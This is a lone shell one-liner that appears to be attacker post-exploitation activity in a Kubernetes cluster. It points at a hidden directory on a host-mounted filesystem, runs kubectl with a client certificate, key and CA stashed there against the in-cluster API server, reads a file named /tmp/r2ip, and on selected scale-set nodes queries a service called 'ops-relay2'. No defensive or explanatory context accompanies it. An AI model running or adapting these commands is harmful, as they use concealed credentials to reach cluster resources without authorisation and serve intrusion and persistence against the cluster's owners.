S=/host/usr/local/lib/.sysup; K="$S/kubectl --client-certificate=$S/kc.pem --client-key=$S/kc.pem --certificate-authority=$S/kube-ca.crt --server=https://kubernetes.default.svc"; cat /tmp/r2ip 2>/dev/null; N=$(cat /etc/hostname); if echo "$N" | grep -q "vmss000000\|vmss000002\|vmss000003"; then echo "[$N] try:"; $K get svc ops-relay2 -n openobserve -o json 2>&1 | head -c 300; fi; echo T33 # 2978227381